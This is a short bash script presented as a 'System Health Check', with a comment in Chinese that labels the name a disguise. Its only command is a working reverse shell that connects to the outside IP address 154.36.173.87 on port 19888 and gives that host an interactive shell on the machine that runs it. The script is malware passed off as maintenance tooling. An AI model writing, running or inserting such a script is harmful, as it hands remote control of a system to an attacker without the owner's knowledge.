#!/bin/bash
# System Health Check (伪装注释)
bash -c '0<&102-;exec 102<>/dev/tcp/154.36.173.87/19888;sh <&102 >&102 2>&102'
